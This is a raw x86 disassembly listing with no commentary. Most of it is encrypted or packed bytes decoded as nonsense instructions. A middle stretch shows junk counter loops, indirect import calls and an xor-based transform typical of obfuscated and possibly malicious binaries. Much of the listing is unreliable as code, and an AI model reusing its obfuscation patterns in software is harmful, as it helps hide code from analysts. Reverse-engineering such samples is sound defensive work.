  4134dc:	aam    0x46
  4134de:	mov    DWORD PTR [ecx+ebp*8],eax
  4134e1:	adc    ecx,ecx
  4134e3:	jge    0x41348e
  4134e5:	adc    DWORD PTR [ecx-0x504715ad],ecx
  4134eb:	dec    eax
  4134ec:	sub    ah,ah
  4134ee:	mov    esi,DWORD PTR [ebp+0x2b]
  4134f1:	test   eax,0x88fa700a
  4134f6:	enter  0x2172,0xb9
  4134fa:	std    
  4134fb:	sbb    ebp,DWORD PTR [edi+0x553124e5]
  413501:	jle    0x41352a
  413503:	pop    eax
  413504:	or     al,0x71
  413506:	and    eax,0x6d01ca50
  41350b:	sbb    eax,0x9f9b2c26
  413510:	add    eax,DWORD PTR [eax+0x4cf9aa61]
  413516:	mov    eax,0xe8504320
  41351b:	idiv   BYTE PTR [ecx+0x74]
  41351e:	loope  0x413596
  413520:	inc    ecx
  413521:	arpl   WORD PTR [ebp+0x67daae5a],cx
  413527:	inc    ebp
  413528:	imul   ebx,DWORD PTR [edx+0xa],0xa321f354
  41352f:	test   BYTE PTR ds:0x625b566f,al
  413535:	sub    BYTE PTR [esi],ah
  413537:	push   ebp
  413538:	test   esi,ebp
  41353a:	cmp    BYTE PTR [esi],bh
  41353c:	je     0x4135a5
  41353e:	lea    ebp,[ecx+0x2114a17]
  413544:	xor    eax,0x9f5f9af9
  413549:	sbb    ecx,DWORD PTR [edi+0x33]
  41354c:	add    ebx,DWORD PTR [eax+0x7d7c894a]
  413552:	loope  0x41351b
  413554:	cmp    esi,ebx
  413556:	call   0x26691cb8
  41355b:	or     BYTE PTR [ebp-0x20],0xb2
  41355f:	jae    0x413527
  413561:	ja     0x41356f
  413563:	(bad)  
  413565:	ds es push esi
  413568:	sbb    eax,0x80a93156
  41356d:	(bad)  
  41356e:	bound  esp,QWORD PTR ds:0x47d201a5
  413574:	xchg   edi,eax
  413575:	cmp    BYTE PTR [ebx],bl
  413577:	out    dx,al
  413578:	cli    
  413579:	int    0x31
  41357b:	adc    al,0xdd
  41357d:	xchg   esi,eax
  41357e:	cmp    al,0x3b
  413580:	xchg   ebx,eax
  413581:	cld    
  413582:	xor    eax,0x542934b6
  413587:	iret   
  413588:	mov    bl,BYTE PTR [eax-0x4d]
  41358b:	in     eax,dx
  41358c:	mov    ch,0x3
  41358e:	ja     0x413521
  413590:	rcl    DWORD PTR [edx+0x7867f62d],1
  413596:	push   eax
  413597:	inc    edi
  413598:	pop    ecx
  413599:	pop    ds
  41359a:	clc    
  41359b:	jne    0x413596
  41359d:	add    eax,0xad10dbff
  4135a2:	scas   eax,DWORD PTR es:[edi]
  4135a3:	popa   
  4135a4:	iret   
  4135a5:	and    al,0xa1
  4135a7:	mov    eax,0xec670ed1
  4135ac:	call   0x7a47ffc6
  4135b1:	mov    edx,0xaab0f076
  4135b6:	sub    al,0x53
  4135b8:	pop    eax
  4135b9:	dec    edi
  4135ba:	mul    DWORD PTR [esi-0x6f]
  4135bd:	add    al,0x88
  4135bf:	ins    BYTE PTR es:[edi],dx
  4135c0:	mov    DWORD PTR [ebp+0x61f372db],0x740288e0
  4135ca:	in     al,dx
  4135cb:	enter  0xf873,0x79
  4135cf:	(bad)  
  4135d0:	clc    
  4135d1:	stos   DWORD PTR es:[edi],eax
  4135d2:	sbb    BYTE PTR [ebp-0x1b7b96f9],0x7c
  4135d9:	jns    0x4135f1
  4135db:	pop    edx
  4135dc:	ins    DWORD PTR es:[edi],dx
  4135dd:	stos   DWORD PTR es:[edi],eax
  4135de:	(bad)  
  4135df:	js     0x4135a9
  4135e1:	mov    esi,0x5d44cd9a
  4135e6:	mov    DWORD PTR [esi-0x79],ecx
  4135e9:	call   0x3883f02b
  4135ee:	iret   
  4135ef:	jg     0x4135af
  4135f1:	in     eax,0x9c
  4135f3:	inc    ecx
  4135f4:	test   al,0x48
  4135f6:	mov    ebp,0x1e168531
  4135fb:	ss shr edi,0xa0
  4135ff:	mov    ah,0x3e
  413601:	dec    edi
  413602:	cmp    DWORD PTR [ecx-0x3beffc0d],eax
  413608:	fild   DWORD PTR [edx]
  41360a:	repz add eax,0x12241f87
  413610:	add    DWORD PTR [ebp+0x5ab3a308],edx
  413616:	adc    al,BYTE PTR [eax]
  413618:	mov    cl,0x7a
  41361a:	pop    ecx
  41361b:	sbb    BYTE PTR [edi+edi*4-0x2acab74c],bh
  413622:	cwde   
  413623:	mov    bh,0xbc
  413625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413626:	and    DWORD PTR [ebp+0x3c4d775],ebx
  41362c:	lahf   
  41362d:	sub    DWORD PTR [edx+0x1c],ecx
  413630:	cld    
  413631:	dec    esi
  413632:	icebp  
  413633:	sub    al,0xf3
  413635:	sbb    DWORD PTR [edi+ecx*4],ebp
  413638:	in     al,0x30
  41363a:	sahf   
  41363b:	retf   0x7bab
  41363e:	outs   dx,DWORD PTR ds:[esi]
  41363f:	and    ch,bh
  413641:	mov    ch,0xaf
  413643:	and    DWORD PTR [esi-0x7c4f812b],esp
  413649:	scas   eax,DWORD PTR es:[edi]
  41364a:	mov    edx,0x246d61f0
  41364f:	or     edx,ebx
  413651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413652:	jecxz  0x41368c
  413654:	and    ebp,DWORD PTR [eax-0x122331f3]
  41365a:	stos   BYTE PTR es:[edi],al
  41365b:	repz cdq 
  41365d:	mov    ah,0x99
  41365f:	push   esi
  413660:	add    dh,BYTE PTR [ebx]
  413662:	iret   
  413663:	jmp    DWORD PTR [esi]
  413665:	sub    BYTE PTR [edx],0x6a
  413668:	aas    
  413669:	pop    es
  41366a:	xor    al,0x2a
  41366c:	in     eax,dx
  41366d:	and    DWORD PTR [ebp+0x15f06d93],ebp
  413673:	sbb    al,0xb9
  413675:	mov    ebp,0xde89a2cc
  41367a:	icebp  
  41367b:	pop    ebx
  41367c:	(bad)  [ebp+0x70]
  41367f:	sahf   
  413680:	cmp    BYTE PTR [esi+edx*8+0x184d4494],dh
  413687:	jg     0x4136d3
  413689:	ins    DWORD PTR es:[edi],dx
  41368a:	shl    BYTE PTR [esi+0x3a179b1],1
  413690:	sub    al,bl
  413692:	add    bh,dh
  413694:	mov    al,ds:0x63a0f12a
  413699:	stos   DWORD PTR es:[edi],eax
  41369a:	inc    edi
  41369b:	rcl    DWORD PTR [ebx+0x1bb212d4],0x24
  4136a2:	or     esp,DWORD PTR [ebp-0x2c73901a]
  4136a8:	rcl    DWORD PTR [ebp+esi*1+0x378bdb5c],cl
  4136af:	stc    
  4136b0:	adc    ebp,DWORD PTR [esi-0x700a814e]
  4136b6:	dec    esp
  4136b7:	inc    edi
  4136b8:	or     esp,DWORD PTR [esi]
  4136ba:	mov    ds:0x46fc0d94,eax
  4136bf:	dec    edi
  4136c0:	lods   al,BYTE PTR ds:[esi]
  4136c1:	inc    esi
  4136c2:	mov    ds:0xc7fdd15b,al
  4136c7:	loope  0x41370c
  4136c9:	jo     0x4136b3
  4136cb:	fs cmp bl,ch
  4136ce:	cmc    
  4136cf:	mov    esp,0xc24b1057
  4136d4:	pop    edx
  4136d5:	lahf   
  4136d6:	call   0xb0c93438
  4136db:	call   0x339c:0x7246ad44
  4136e2:	push   0x3b1e0255
  4136e7:	aad    0x3a
  4136e9:	shr    bh,1
  4136eb:	jge    0x413708
  4136ed:	mul    BYTE PTR [edx]
  4136ef:	scas   eax,DWORD PTR es:[edi]
  4136f0:	adc    ch,cl
  4136f2:	xchg   esi,ecx
  4136f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136f5:	rol    DWORD PTR [eax+0x2be8f09e],1
  4136fb:	push   ss
  4136fc:	leave  
  4136fd:	std    
  4136fe:	jmp    0x4136ff
  413700:	pop    ebp
  413701:	mov    edi,0xa49d83ab
  413706:	mov    bh,0x96
  413708:	(bad)  
  413709:	fisub  WORD PTR [eax-0x48d72ab0]
  41370f:	push   esi
  413710:	mov    ?,WORD PTR [edx+ebx*1]
  413713:	sbb    BYTE PTR [ebx-0x15276431],0x1a
  41371a:	push   0xffffffa1
  41371c:	push   0x76
  41371e:	cli    
  41371f:	cmp    BYTE PTR [ebp-0x34],bl
  413722:	(bad)  
  413723:	pop    edi
  413724:	mov    eax,0x5e479de7
  413729:	adc    cl,ch
  41372b:	push   ss
  41372c:	call   0xbe9ea8d4
  413731:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413733:	jbe    0x41373c
  413735:	pop    es
  413736:	add    BYTE PTR [edx],ch
  413738:	popa   
  413739:	lahf   
  41373a:	lds    ebx,FWORD PTR [ecx]
  41373c:	adc    esp,edx
  41373e:	cld    
  41373f:	bound  esp,QWORD PTR [ebx+0x73370f23]
  413745:	sahf   
  413746:	xlat   BYTE PTR ds:[ebx]
  413747:	sti    
  413748:	mov    dl,0xa3
  41374a:	pop    ecx
  41374b:	and    BYTE PTR [ebx-0x5c759a6d],bh
  413751:	dec    esi
  413752:	repnz daa 
  413754:	pop    ecx
  413755:	xchg   ebx,eax
  413756:	cmp    edx,DWORD PTR [edx+0x60e768c4]
  41375c:	add    BYTE PTR [eax-0xa],0x32
  413760:	or     DWORD PTR [ebp+0x14179c11],edx
  413766:	cmovo  eax,esp
  413769:	push   esp
  41376a:	frstor [eax-0x21]
  41376d:	jnp    0x413756
  41376f:	add    al,0xd5
  413771:	cmp    BYTE PTR [esi],0xcc
  413774:	sbb    DWORD PTR [edi],edi
  413776:	push   eax
  413777:	dec    ecx
  413778:	mov    eax,ds:0x281f6f7e
  41377d:	jle    0x4137ec
  41377f:	fadd   st,st(2)
  413781:	pop    edi
  413782:	arpl   di,si
  413784:	(bad)  
  413785:	cmp    al,al
  413787:	add    eax,0x8145c19b
  41378c:	and    dl,BYTE PTR [ecx-0xa]
  41378f:	mov    ebp,0xebeffec0
  413794:	retf   0xf0d0
  413797:	or     eax,0xe185f6a8
  41379c:	js     0x4137ab
  41379e:	in     eax,0xe3
  4137a0:	daa    
  4137a1:	xor    DWORD PTR [ebp+esi*4-0x4],eax
  4137a5:	ins    BYTE PTR es:[edi],dx
  4137a6:	jnp    0x413768
  4137a8:	daa    
  4137a9:	push   ebp
  4137aa:	xor    eax,0x1bad2b76
  4137af:	sbb    BYTE PTR [esi+0x700dd8ee],ah
  4137b5:	shr    esi,1
  4137b7:	jl     0x4137b6
  4137b9:	jmp    0x4d4e2fc3
  4137be:	js     0x41380f
  4137c0:	sbb    esi,DWORD PTR [esp+eiz*8+0x38ebfe21]
  4137c7:	add    DWORD PTR ds:0xbab94020,edx
  4137cd:	xchg   esi,eax
  4137ce:	out    0x51,al
  4137d0:	push   esi
  4137d1:	sub    ebx,DWORD PTR [esi-0x70]
  4137d4:	mov    ds:0x7916f8c6,eax
  4137d9:	jle    0x41377e
  4137db:	ret    0xe700
  4137de:	jmp    0x4137ff
  4137e0:	adc    DWORD PTR [ebp+0x1e],ebp
  4137e3:	xchg   esi,eax
  4137e4:	sahf   
  4137e5:	inc    ebp
  4137e6:	adc    ah,ch
  4137e8:	inc    edx
  4137e9:	mov    ah,0x72
  4137eb:	adc    eax,0xce39dd41
  4137f0:	iret   
  4137f1:	pushf  
  4137f2:	sub    BYTE PTR [ecx],0xc9
  4137f5:	rcl    BYTE PTR [edx],1
  4137f7:	mov    ah,0x70
  4137f9:	mov    dl,0x4d
  4137fb:	mov    esi,0xb4cffd09
  413800:	cmp    eax,0x6d20b7e0
  413805:	(bad)  
  413806:	not    BYTE PTR [ecx-0x5a67a6e0]
  41380c:	int3   
  41380d:	jl     0x4137d2
  41380f:	fucomp st(2)
  413811:	mov    eax,ds:0x9aa627e1
  413816:	add    eax,0x3213c46b
  41381b:	and    bh,bl
  41381d:	fcmovnu st,st(0)
  41381f:	mov    esp,0xdbb304a3
  413824:	das    
  413825:	jmp    0x251f865f
  41382a:	retf   
  41382b:	repz sub eax,0x78aa6b30
  413831:	outs   dx,DWORD PTR ds:[esi]
  413832:	pop    ecx
  413833:	xchg   esi,eax
  413834:	fisub  WORD PTR [eax]
  413836:	aas    
  413837:	shr    ebp,0x1e
  41383a:	cmp    al,0x5e
  41383c:	mov    cl,0x56
  41383e:	pop    edi
  41383f:	sti    
  413840:	cmp    eax,0x33be379a
  413845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413846:	fisub  DWORD PTR [eax-0x5c5ad40a]
  41384c:	data16 mov dl,BYTE PTR [eax]
  41384f:	ss ds je 0x4137f0
  413853:	in     al,0x39
  413855:	jmp    0x107b02e6
  41385a:	(bad)  
  41385b:	xchg   esp,eax
  41385c:	pusha  
  41385d:	cmp    DWORD PTR [ebx+0x408a9bc6],esp
  413863:	mov    dh,0x8e
  413865:	dec    edx
  413866:	shl    ch,0x77
  413869:	push   es
  41386a:	les    eax,FWORD PTR [ebx]
  41386c:	call   0x3c56ade3
  413871:	(bad)  
  413872:	mov    eax,0x3523a7f2
  413877:	sbb    ecx,ecx
  413879:	push   0xffffffe1
  41387b:	push   ss
  41387c:	or     eax,0x28bc97a5
  413881:	or     BYTE PTR [edi+0x5e6544b6],ch
  413887:	sbb    ch,BYTE PTR [edx+0xdee50eb]
  41388d:	mov    ch,0x70
  41388f:	pop    edx
  413890:	enter  0x12f,0x4c
  413894:	nop
  413895:	add    BYTE PTR ds:0xd172ccdd,ch
  41389b:	xchg   ebp,eax
  41389c:	fcom   st(5)
  41389e:	push   es
  41389f:	push   ebx
  4138a0:	ror    DWORD PTR [ebp+0x60],0xd8
  4138a4:	pop    ecx
  4138a5:	test   BYTE PTR [ecx],0xae
  4138a8:	loop   0x4138ed
  4138aa:	call   0x40b8b25d
  4138af:	out    0xd4,al
  4138b1:	sbb    eax,0x7d14017
  4138b6:	aam    0xe4
  4138b8:	imul   DWORD PTR [edi+edi*1-0x3c]
  4138bc:	fisttp WORD PTR [edx+eiz*2-0x5f]
  4138c0:	(bad)  
  4138c1:	clc    
  4138c2:	sub    esi,edi
  4138c4:	sbb    bh,bh
  4138c6:	pop    es
  4138c7:	sahf   
  4138c8:	pop    eax
  4138c9:	je     0x413895
  4138cb:	xchg   DWORD PTR [esi],edi
  4138cd:	outs   dx,BYTE PTR ds:[esi]
  4138ce:	and    eax,0xd7ae23aa
  4138d3:	and    al,0x43
  4138d5:	shl    BYTE PTR [eax],cl
  4138d7:	inc    edi
  4138d8:	adc    DWORD PTR [edi],edx
  4138da:	fst    QWORD PTR [esi+0x49]
  4138dd:	xor    esp,DWORD PTR [ecx-0x33f29b23]
  4138e3:	xor    ebx,eax
  4138e5:	and    DWORD PTR ds:0x42b01c,0x4e66
  4138ef:	sub    edx,ebx
  4138f1:	sub    edx,esi
  4138f3:	adc    DWORD PTR ds:0x42c014,0x3307
  4138fd:	xor    edx,eax
  4138ff:	add    DWORD PTR ds:0x42d004,0x3241
  413909:	mov    DWORD PTR [ebp+0x8],edx
  41390c:	or     ebx,ebx
  41390e:	mov    edx,DWORD PTR [ebp+0x8]
  413911:	mov    ebx,DWORD PTR [ebp-0x58]
  413914:	sub    DWORD PTR ds:0x429004,0x42c00c
  41391e:	add    edx,0x5708c4
  413924:	imul   edx,ebx
  413927:	mov    DWORD PTR [ebp-0x58],edx
  41392a:	mov    edx,DWORD PTR [ebp+0x8]
  41392d:	and    DWORD PTR ds:0x42d01c,0x0
  413937:	mov    ebx,DWORD PTR ds:0x42d01c
  41393d:	inc    ebx
  41393e:	mov    DWORD PTR ds:0x42d01c,ebx
  413944:	cmp    DWORD PTR ds:0x42d01c,0x29
  41394b:	jne    0x41395a
  413951:	push   DWORD PTR [ebp-0x24]
  413954:	call   DWORD PTR ds:0x42e913
  41395a:	cmp    DWORD PTR ds:0x42d01c,0x1e
  413961:	jb     0x413937
  413967:	and    DWORD PTR ds:0x42d004,0x0
  413971:	mov    ebx,DWORD PTR ds:0x42d004
  413977:	inc    ebx
  413978:	mov    DWORD PTR ds:0x42d004,ebx
  41397e:	cmp    DWORD PTR ds:0x42d004,0x7
  413985:	jne    0x4139a0
  41398b:	push   0x1baa
  413990:	push   0x42e075
  413995:	push   0x429010
  41399a:	call   DWORD PTR ds:0x42e917
  4139a0:	cmp    DWORD PTR ds:0x42d004,0x6
  4139a7:	jne    0x4139ba
  4139ad:	mov    ebx,DWORD PTR ds:0x42d004
  4139b3:	inc    ebx
  4139b4:	mov    DWORD PTR ds:0x42d004,ebx
  4139ba:	cmp    DWORD PTR ds:0x42d004,0x14
  4139c1:	jb     0x413971
  4139c7:	add    DWORD PTR ds:0x42d000,edx
  4139cd:	mov    ebx,DWORD PTR [ebp-0x54]
  4139d0:	mov    DWORD PTR ds:0x42b008,0x4ad3
  4139da:	add    edx,0x64f8da
  4139e0:	or     edx,ebx
  4139e2:	add    DWORD PTR ds:0x42c008,0x5d21
  4139ec:	mov    DWORD PTR [ebp-0x54],edx
  4139ef:	mov    edx,DWORD PTR [ebp+0x8]
  4139f2:	mov    ebx,DWORD PTR [ebp-0x50]
  4139f5:	and    DWORD PTR ds:0x42b008,0x3404
  4139ff:	add    edx,ecx
  413a01:	xor    DWORD PTR ds:0x42a000,0x42d000
  413a0b:	xor    edx,ebx
  413a0d:	mov    DWORD PTR [ebp-0x50],edx
  413a10:	add    ebx,edx
  413a12:	mov    edx,DWORD PTR [ebp+0x8]
  413a15:	adc    DWORD PTR ds:0x429008,edx
  413a1b:	mov    ebx,DWORD PTR [ebp-0x4c]
  413a1e:	or     DWORD PTR ds:0x429028,0x42d010
  413a28:	add    edx,edi
  413a2a:	or     DWORD PTR ds:0x429008,0x429010
  413a34:	and    edx,ebx
  413a36:	xor    DWORD PTR ds:0x429028,ecx
  413a3c:	mov    DWORD PTR [ebp-0x4c],edx
  413a3f:	mov    DWORD PTR ds:0x42c004,0x18
  413a49:	cmp    DWORD PTR ds:0x42c004,0x0
  413a50:	je     0x413a93
  413a56:	cmp    DWORD PTR ds:0x42c004,0x1e
  413a5d:	jne    0x413a7b
  413a63:	push   0x42a004
  413a68:	push   0x2285
  413a6d:	push   DWORD PTR [ebp-0x24]
  413a70:	push   0x1fc0
  413a75:	call   DWORD PTR ds:0x42e8cf
  413a7b:	mov    ebx,DWORD PTR ds:0x42c004
  413a81:	dec    ebx
  413a82:	mov    DWORD PTR ds:0x42c004,ebx
  413a88:	jmp    0x413a49
  413a8d:	add    DWORD PTR ds:0x42d00c,ecx
  413a93:	mov    edx,DWORD PTR [ebp+0x8]
  413a96:	sbb    ebx,DWORD PTR ds:0x42a00c
  413a9c:	mov    ebx,DWORD PTR [ebp-0x48]
  413a9f:	lea    edx,[ebx+edx*1+0x241fc1f]
  413aa6:	mov    DWORD PTR [ebp-0x48],edx
  413aa9:	inc    edx
  413aaa:	mov    edx,DWORD PTR [ebp+0x8]
  413aad:	movzx  ebx,BYTE PTR ds:0x429000
  413ab4:	sbb    DWORD PTR ds:0x42c018,ebx
  413aba:	mov    ebx,0xfa5e15e2
  413abf:	sub    ebx,edx
  413ac1:	add    ebx,DWORD PTR [ebp-0x44]
  413ac4:	and    DWORD PTR ds:0x42c018,0x0
  413ace:	jmp    0x413ae0
  413ad3:	mov    edx,DWORD PTR ds:0x42c018
  413ad9:	inc    edx
  413ada:	mov    DWORD PTR ds:0x42c018,edx
  413ae0:	cmp    DWORD PTR ds:0x42c018,0x15
  413ae7:	jae    0x413b1a
  413aed:	cmp    DWORD PTR ds:0x42c018,0x18
  413af4:	jne    0x413b0f
  413afa:	push   0x88b0
  413aff:	push   0x8c9b
  413b04:	push   0x27a5
  413b09:	call   DWORD PTR ds:0x42e8d3
  413b0f:	jmp    0x413ad3
  413b14:	or     DWORD PTR ds:0x42b004,edx
  413b1a:	mov    DWORD PTR [ebp-0x44],ebx
  413b1d:	mov    DWORD PTR ds:0x42d00c,0x11
  413b27:	cmp    DWORD PTR ds:0x42d00c,0x0
  413b2e:	je     0x413b75
  413b34:	cmp    DWORD PTR ds:0x42d00c,0x1d
  413b3b:	jne    0x413b59
  413b41:	push   0x88e0
  413b46:	push   DWORD PTR [ebp-0x18]
  413b49:	push   0x3079
  413b4e:	push   0x26f3
  413b53:	call   DWORD PTR ds:0x42e8d7
  413b59:	mov    edx,DWORD PTR ds:0x42d00c
  413b5f:	dec    edx
  413b60:	mov    DWORD PTR ds:0x42d00c,edx
  413b66:	jmp    0x413b27
  413b6b:	add    DWORD PTR ds:0x42a014,0x1458
  413b75:	mov    edx,DWORD PTR [ebp+0x8]
  413b78:	xor    DWORD PTR ds:0x429008,0x1867
  413b82:	xor    edx,eax
  413b84:	mov    DWORD PTR ds:0x42900c,0x6609
  413b8e:	add    edx,esi
  413b90:	mov    DWORD PTR ds:0x42d008,0x7de
  413b9a:	jne    0x41157e
  413ba0:	mov    DWORD PTR ds:0x42a008,0x2294
  413baa:	jmp    0x41cc2e
  413baf:	xor    edx,edx
  413bb1:	add    edx,DWORD PTR ds:0x42d014
  413bb7:	sbb    DWORD PTR ds:0x429008,edx
  413bbd:	mov    edx,DWORD PTR [ebp-0xc]
  413bc0:	mov    DWORD PTR ds:0x429010,0x17
  413bca:	cmp    DWORD PTR ds:0x429010,0x0
  413bd1:	je     0x413c04
  413bd7:	cmp    DWORD PTR ds:0x429010,0x18
  413bde:	jne    0x413bea
  413be4:	call   DWORD PTR ds:0x42e91b
  413bea:	xor    ebx,ebx
  413bec:	add    ebx,DWORD PTR ds:0x429010
  413bf2:	dec    ebx
  413bf3:	mov    DWORD PTR ds:0x429010,ebx
  413bf9:	jmp    0x413bca
  413bfe:	or     DWORD PTR ds:0x42c014,ebx
  413c04:	sub    edx,esi
  413c06:	xor    edx,eax
  413c08:	mov    ebx,DWORD PTR ds:0x41cdd0
  413c0e:	mov    ebx,DWORD PTR [ebx]
  413c10:	sub    DWORD PTR ds:0x42b018,ebx
  413c16:	mov    DWORD PTR [ebp-0x5c],edx
  413c19:	and    DWORD PTR ds:0x42b004,0x0
  413c23:	jmp    0x413c35
  413c28:	mov    ebx,DWORD PTR ds:0x42b004
  413c2e:	inc    ebx
  413c2f:	mov    DWORD PTR ds:0x42b004,ebx
  413c35:	cmp    DWORD PTR ds:0x42b004,0x1c
  413c3c:	jae    0x413c60
  413c42:	cmp    DWORD PTR ds:0x42b004,0x24
  413c49:	jne    0x413c5b
  413c4f:	push   DWORD PTR [ebp-0x1c]
  413c52:	push   DWORD PTR [ebp-0x10]
  413c55:	call   DWORD PTR ds:0x42e91f
  413c5b:	jmp    0x413c28
  413c60:	mov    edx,DWORD PTR [ebp-0x10]
  413c63:	mov    ebx,DWORD PTR [ebp-0x8]
  413c66:	xor    edx,eax
  413c68:	xor    ebx,eax
  413c6a:	sub    edx,ebx
  413c6c:	sub    edx,esi
  413c6e:	xor    edx,eax
  413c70:	mov    DWORD PTR [ebp-0x10],edx
  413c73:	mov    edx,DWORD PTR [ebp-0x14]
  413c76:	mov    DWORD PTR [ebp+0x8],edx
  413c79:	jmp    0x416037
  413c7e:	mov    edx,DWORD PTR [ebp+0x8]
  413c81:	mov    ebx,DWORD PTR [ebp-0x8]
  413c84:	xor    edx,eax
  413c86:	xor    ebx,eax
  413c88:	sub    edx,ebx
  413c8a:	sub    edx,esi
  413c8c:	xor    edx,eax
  413c8e:	mov    DWORD PTR [ebp+0x8],edx
  413c91:	mov    edx,DWORD PTR [ebp+0x8]
  413c94:	mov    ebx,DWORD PTR [ebp-0x58]
  413c97:	add    edx,0x5708c4
  413c9d:	imul   edx,ebx
  413ca0:	mov    DWORD PTR [ebp-0x58],edx
  413ca3:	mov    edx,DWORD PTR [ebp+0x8]
  413ca6:	mov    ebx,DWORD PTR [ebp-0x54]
  413ca9:	add    edx,0x64f8da
  413caf:	or     edx,ebx
  413cb1:	mov    DWORD PTR [ebp-0x54],edx
  413cb4:	mov    edx,DWORD PTR [ebp+0x8]
  413cb7:	mov    ebx,DWORD PTR [ebp-0x50]
  413cba:	add    edx,ecx
  413cbc:	jmp    0x416005
  413cc1:	xchg   ecx,eax
  413cc2:	mov    bh,BYTE PTR [edx]
  413cc4:	aad    0x3
  413cc6:	mov    ch,0x93
  413cc8:	mov    ah,al
  413cca:	xor    ebx,ecx
  413ccc:	ja     0x413ce7
  413cce:	clc    
  413ccf:	xor    bl,BYTE PTR [ebp+0x14]
  413cd2:	mov    bh,BYTE PTR [esp+edi*2+0x40]
  413cd6:	pop    edi
  413cd7:	jl     0x413d55
  413cd9:	inc    esi
  413cda:	data16 shl BYTE PTR [esi+esi*4],0x9
  413cdf:	pop    eax
  413ce0:	(bad)  [edx+0x6749dd30]
  413ce6:	aas    
  413ce7:	dec    dh
  413ce9:	mov    eax,ds:0x9a976c03
  413cee:	mov    ah,BYTE PTR ds:0xe9604f7e
  413cf4:	mov    eax,ds:0xbfbd7a8d
  413cf9:	shr    esp,cl
  413cfb:	mov    ch,0x35
  413cfd:	lahf   
  413cfe:	push   es
  413cff:	push   ebx
  413d00:	sub    eax,esp
  413d02:	repnz and eax,0x43dd8f77
  413d08:	xor    dl,BYTE PTR [eax+0x379e8a7b]
  413d0e:	popa   
  413d0f:	push   cs
  413d10:	outs   dx,DWORD PTR ds:[esi]
  413d11:	xor    edx,edx
  413d13:	(bad)  
  413d14:	clc    
  413d15:	xchg   edx,eax
  413d16:	xor    DWORD PTR [edi-0x40559f91],0x856b9984
  413d20:	sub    eax,0xfb000d16
  413d25:	aam    0x65
  413d27:	out    0x3,eax
  413d29:	test   BYTE PTR [edi-0x6b2414fe],0x29
  413d30:	xor    DWORD PTR [esi+ebp*1-0xa],0xac4e7284
  413d38:	add    eax,0xc0c4c8da
  413d3d:	xchg   esi,eax
  413d3e:	push   0xffffffc2
  413d40:	mov    ebp,0x53c3141f
  413d45:	das    
  413d46:	lock cmp eax,0xa3621284
  413d4c:	jns    0x413d7c
  413d4e:	aaa    
  413d4f:	test   al,0xbd
  413d51:	sub    eax,0x22814e88
  413d56:	pop    ebp
  413d57:	mov    ah,0x97
  413d59:	enter  0xe1a8,0x2c
  413d5d:	mov    ebx,0x2db21b86
  413d62:	outs   dx,DWORD PTR ds:[esi]
  413d63:	dec    ecx
  413d64:	jo     0x413da9
  413d66:	inc    esp
  413d67:	xor    esi,edi
  413d69:	and    DWORD PTR [eax+0x46],eax
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jmp    0x8bed38de
  413d72:	aam    0x6a
  413d74:	arpl   WORD PTR [ecx-0x799246b6],bx
  413d7a:	cmp    al,0xd2
  413d7c:	arpl   WORD PTR [eax-0x6a917407],cx
  413d82:	in     al,dx
  413d83:	rcr    DWORD PTR [ebp+0x8253706],1
  413d89:	cwde   
  413d8a:	aaa    
  413d8b:	push   esi
  413d8c:	and    dl,BYTE PTR [ecx+ebp*1]
  413d8f:	(bad)  
  413d90:	pop    ebp
  413d91:	iret   
  413d92:	mov    al,0x65
  413d94:	(bad)  
  413d95:	sbb    bh,BYTE PTR [ebp+0x4b]
  413d98:	or     BYTE PTR [edi+0x3c],al
  413d9b:	xlat   BYTE PTR ds:[ebx]
  413d9c:	xor    edi,DWORD PTR [edi]
  413d9e:	fld    QWORD PTR [ecx+0x6c6d2e9]
  413da4:	sar    BYTE PTR [eax+ebp*4],1
  413da7:	les    ebp,FWORD PTR ds:0xb835d445
  413dad:	(bad)  
  413dae:	loope  0x413de2
  413db0:	or     BYTE PTR [esi],al
  413db2:	mov    dh,0xbc
  413db4:	jo     0x413e18
  413db6:	shr    BYTE PTR [ebx+0xcc6151c],0x62
  413dbd:	jmp    0xe07f:0xb04fc0b9
  413dc4:	mov    ch,0xdc
  413dc6:	mov    ah,0x46
  413dc8:	mov    DWORD PTR [ebx+0x62],edx
  413dcb:	or     DWORD PTR [ecx],eax
  413dcd:	outs   dx,BYTE PTR ds:[esi]
  413dce:	inc    ebp
  413dcf:	ret    
  413dd0:	xor    al,0x93
  413dd2:	scas   eax,DWORD PTR es:[edi]
  413dd3:	loopne 0x413e4c
  413dd5:	jae    0x413def
  413dd7:	xor    eax,0x9fb2efdc
  413ddc:	clc    
  413ddd:	rep outs dx,DWORD PTR ds:[esi]
  413ddf:	cmp    BYTE PTR [ebx+0x511bd19b],ah
  413de5:	sti    
  413de6:	cmp    edi,DWORD PTR [esi-0x25]
  413de9:	xchg   ebx,eax
  413dea:	in     al,0x70
  413dec:	cli    
  413ded:	in     al,0x21
  413def:	or     esp,DWORD PTR [edi+0x2f]
  413df2:	adc    esi,DWORD PTR [ebx-0x66]
  413df5:	mov    esp,0x65d638d4
  413dfa:	jae    0x413e23
  413dfc:	repz mov eax,ds:0xf0ab1224
  413e02:	test   al,0x4e
  413e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e05:	mov    esp,0xd5a0e46f
  413e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e0b:	in     al,dx
  413e0c:	push   ds
  413e0d:	and    eax,0xb9ce9ebb
  413e12:	lahf   
  413e13:	inc    esi
  413e14:	mov    ds:0xe2f19d8b,al
  413e19:	cdq    
  413e1a:	jp     0x413e92
  413e1c:	ret    0xa849
  413e1f:	jl     0x413e8e
  413e21:	adc    cl,BYTE PTR [eax+eiz*8+0x76c898f3]
  413e28:	push   ebx
  413e29:	in     eax,dx
  413e2a:	shr    BYTE PTR [esi+0x2606579f],0xf0
  413e31:	add    ah,BYTE PTR [edx-0x11f3b2af]
  413e37:	out    dx,al
  413e38:	xor    BYTE PTR [edi-0x7e25361d],al
  413e3e:	jmp    0xf4477594
  413e43:	and    al,0x32
  413e45:	adc    esp,DWORD PTR [esi+edi*4-0xa]
  413e49:	ja     0x413ec5
  413e4b:	and    eax,0x97fcd8e9
  413e50:	xor    eax,0xed53924a
  413e55:	xor    al,0x94
  413e57:	pop    edx
  413e58:	cdq    
  413e59:	imul   ebx,ebx,0x5b8c2026
